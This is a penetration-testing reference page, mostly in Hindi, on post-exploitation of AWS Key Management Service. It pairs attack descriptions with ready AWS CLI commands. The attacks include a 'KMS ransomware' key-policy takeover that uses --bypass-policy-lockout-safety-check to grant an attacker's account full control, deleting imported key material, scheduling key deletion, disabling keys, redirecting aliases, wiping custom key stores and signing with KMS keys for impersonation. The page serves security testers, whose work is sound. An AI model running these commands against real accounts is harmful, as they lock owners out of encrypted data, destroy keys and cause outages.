# AWS - KMS Post Exploitation

{{#include ../../../../banners/hacktricks-training.md}}

## KMS

अधिक जानकारी के लिए देखें:

{{#ref}}
../../aws-services/aws-kms-enum.md
{{#endref}}

### Encrypt/Decrypt information

`fileb://` और `file://` वे URI schemes हैं जो AWS CLI commands में स्थानीय फाइलों का path निर्दिष्ट करने के लिए उपयोग किए जाते हैं:

- `fileb://:` फाइल को बाइनरी मोड में पढ़ता है, आमतौर पर गैर-टेक्स्ट फ़ाइलों के लिए उपयोग होता है।
- `file://:` फाइल को टेक्स्ट मोड में पढ़ता है, सामान्यतः plain text files, scripts, या JSON के लिए उपयोग होता है जो विशेष encoding आवश्यकताओं के बिना हों।

> [!TIP]
> ध्यान दें कि यदि आप किसी फ़ाइल के भीतर कुछ डेटा को decrypt करना चाहते हैं, तो फ़ाइल में binary data होना चाहिए, base64 encoded data नहीं। (fileb://)

- एक **symmetric** key का उपयोग
```bash
# Encrypt data
aws kms encrypt \
--key-id f0d3d719-b054-49ec-b515-4095b4777049 \
--plaintext fileb:///tmp/hello.txt \
--output text \
--query CiphertextBlob | base64 \
--decode > ExampleEncryptedFile

# Decrypt data
aws kms decrypt \
--ciphertext-blob fileb://ExampleEncryptedFile \
--key-id f0d3d719-b054-49ec-b515-4095b4777049 \
--output text \
--query Plaintext | base64 \
--decode
```
- **asymmetric** key का उपयोग करना:
```bash
# Encrypt data
aws kms encrypt \
--key-id d6fecf9d-7aeb-4cd4-bdd3-9044f3f6035a \
--encryption-algorithm RSAES_OAEP_SHA_256 \
--plaintext fileb:///tmp/hello.txt \
--output text \
--query CiphertextBlob | base64 \
--decode > ExampleEncryptedFile

# Decrypt data
aws kms decrypt \
--ciphertext-blob fileb://ExampleEncryptedFile \
--encryption-algorithm RSAES_OAEP_SHA_256 \
--key-id d6fecf9d-7aeb-4cd4-bdd3-9044f3f6035a \
--output text \
--query Plaintext | base64 \
--decode
```
### KMS Ransomware

KMS पर privileged access रखने वाला attacker KMS की keys की KMS policy को संशोधित कर सकता है और **अपने खाते को उन पर access दे सकता है**, जिससे legit account को दिया गया access हटा दिया जाता है।

इसके बाद, legit account users उन किसी भी सेवा की कोई भी जानकारी access नहीं कर पाएँगे जो इन keys से encrypted है, जिससे account पर एक आसान परंतु प्रभावी ransomware बन जाता है।

> [!WARNING]
> ध्यान दें कि **AWS managed keys aren't affected** इस हमले से प्रभावित नहीं होते, केवल **Customer managed keys** प्रभावित होते हैं।
>
> साथ ही ध्यान दें कि पैरामीटर **`--bypass-policy-lockout-safety-check`** का उपयोग आवश्यक है (web console में यह विकल्प न होने के कारण यह हमला केवल CLI से ही संभव है)।
```bash
# Force policy change
aws kms put-key-policy --key-id mrk-c10357313a644d69b4b28b88523ef20c \
--policy-name default \
--policy file:///tmp/policy.yaml \
--bypass-policy-lockout-safety-check

{
"Id": "key-consolepolicy-3",
"Version": "2012-10-17",
"Statement": [
{
"Sid": "Enable IAM User Permissions",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::<your_own_account>:root"
},
"Action": "kms:*",
"Resource": "*"
}
]
}
```
> [!CAUTION]
> ध्यान दें कि यदि आप उस policy को बदलते हैं और केवल access को एक external account को देते हैं, और फिर इस external account से आप एक नया policy सेट करने की कोशिश करते हैं ताकि **give the access back to original account, you won't be able cause the Put Polocy action cannot be performed from a cross account**।

<figure><img src="../../../images/image (77).png" alt=""><figcaption></figcaption></figure>

### Generic KMS Ransomware

global KMS Ransomware को अंजाम देने का एक और तरीका है, जिसमें निम्नलिखित चरण शामिल होंगे:

- Create a new **key with a key material** जिसे attacker ने import किया हो
- **Re-encrypt older data** जिसे victim के previous version से encrypt किया गया था, उसे नए version से re-encrypt करें।
- **Delete the KMS key**
- अब केवल attacker ही, जिसके पास original key material है, encrypted data को decrypt कर पाएगा

### Delete Keys via kms:DeleteImportedKeyMaterial

With the `kms:DeleteImportedKeyMaterial` permission, an actor can delete the imported key material from CMKs with `Origin=EXTERNAL` (CMKs that have imported their key material), making them unable to decrypt data. This action is destructive and irreversible unless compatible material is re-imported, allowing an attacker to effectively cause ransomware-like data loss by rendering encrypted information permanently inaccessible.
```bash
aws kms delete-imported-key-material --key-id <Key_ID>
```
### कुंजियाँ नष्ट करना

कुंजियाँ नष्ट करने से DoS किया जा सकता है।
```bash
# Schedule the destoy of a key (min wait time is 7 days)
aws kms schedule-key-deletion \
--key-id arn:aws:kms:us-west-2:123456789012:key/1234abcd-12ab-34cd-56ef-1234567890ab \
--pending-window-in-days 7
```
> [!CAUTION]
> ध्यान दें कि AWS अब **पहले की क्रियाओं को cross account से निष्पादित किए जाने से रोकता है:**

### Alias बदलें या हटाएँ
यह हमला AWS KMS aliases को delete या redirect कर देता है, जिससे key resolution टूट जाती है और उन services में तत्काल विफलताएँ होती हैं जो उन aliases पर निर्भर करती हैं, परिणामस्वरूप denial-of-service हो जाता है। `kms:DeleteAlias` या `kms:UpdateAlias` जैसे permissions होने पर एक attacker aliases को remove या repoint कर सकता है और cryptographic operations (e.g., encrypt, describe) को बाधित कर सकता है। कोई भी service जो key ID के बजाय alias को reference करती है, तब तक fail हो सकती है जब तक alias को restore या सही तरीके से remap नहीं किया जाता।
```bash
# Delete Alias
aws kms delete-alias --alias-name alias/<key_alias>

# Update Alias
aws kms update-alias \
--alias-name alias/<key_alias> \
--target-key-id <new_target_key>
```
### कुंजी हटाने को रद्द करना
`kms:CancelKeyDeletion` और `kms:EnableKey` जैसी अनुमतियों के साथ, कोई actor किसी AWS KMS customer master key की निर्धारित deletion को रद्द कर सकता है और बाद में उसे फिर से सक्षम कर सकता है। ऐसा करने से कुंजी पुनः प्राप्त हो जाती है (initially in Disabled state) और यह पहले से सुरक्षित डेटा को decrypt करने की क्षमता बहाल कर देती है, जिससे exfiltration संभव हो जाता है।
```bash
# Firts cancel de deletion
aws kms cancel-key-deletion \
--key-id <Key_ID>

## Second enable the key
aws kms enable-key \
--key-id <Key_ID>
```
### Disable Key
`kms:DisableKey` अनुमति के साथ, एक अभिकर्ता AWS KMS customer master key को निष्क्रिय कर सकता है, जिससे उसे encryption या decryption के लिए उपयोग नहीं किया जा सकेगा। यह उस CMK पर निर्भर किसी भी सेवा की पहुंच को बाधित कर देता है और जब तक key को पुनः सक्षम नहीं किया जाता, तब तक तत्काल व्यवधान या denial-of-service हो सकता है।
```bash
aws kms disable-key \
--key-id <key_id>
```
### Derive Shared Secret
With the `kms:DeriveSharedSecret` permission, एक actor KMS-में रखी निजी कुंजी और उपयोगकर्ता-प्रदान सार्वजनिक कुंजी का उपयोग करके एक ECDH साझा रहस्य गणना कर सकता है।
```bash
aws kms derive-shared-secret \
--key-id <key_id> \
--public-key fileb:///<route_to_public_key> \
--key-agreement-algorithm <algorithm>
```
### Impersonation via kms:Sign
`kms:Sign` permission के साथ, एक actor KMS-stored CMK का उपयोग करके private key को उजागर किए बिना डेटा को cryptographically साइन कर सकता है, जिससे ऐसे वैध सिग्नेचर बनते हैं जो impersonation को सक्षम कर सकते हैं या दुर्भावनापूर्ण कार्रवाइयों को अधिकृत कर सकते हैं।
```bash
aws kms sign \
--key-id <key-id> \
--message fileb://<ruta-al-archivo> \
--signing-algorithm <algoritmo> \
--message-type RAW
```
### DoS with Custom Key Stores
यदि किसी को `kms:DeleteCustomKeyStore`, `kms:DisconnectCustomKeyStore`, या `kms:UpdateCustomKeyStore` जैसी permissions मिलती हैं, तो एक actor किसी AWS KMS Custom Key Store (CKS) को संशोधित, डिस्कनेक्ट, या डिलीट कर सकता है, जिससे उसके master keys निष्क्रिय हो जाते हैं। इससे उन सेवाओं के लिए एन्क्रिप्शन, डिक्रिप्शन, और साइनिंग ऑपरेशन प्रभावित होते हैं जो उन keys पर निर्भर हैं और यह तुरंत denial-of-service का कारण बन सकता है। इसलिए इन permissions को सीमित और मॉनिटर करना अत्यंत आवश्यक है।
```bash
aws kms delete-custom-key-store --custom-key-store-id <CUSTOM_KEY_STORE_ID>

aws kms disconnect-custom-key-store --custom-key-store-id <CUSTOM_KEY_STORE_ID>

aws kms update-custom-key-store --custom-key-store-id <CUSTOM_KEY_STORE_ID> --new-custom-key-store-name <NEW_NAME> --key-store-password <NEW_PASSWORD>
```
<figure><img src="../../../images/image (76).png" alt=""><figcaption></figcaption></figure>

{{#include ../../../../banners/hacktricks-training.md}}
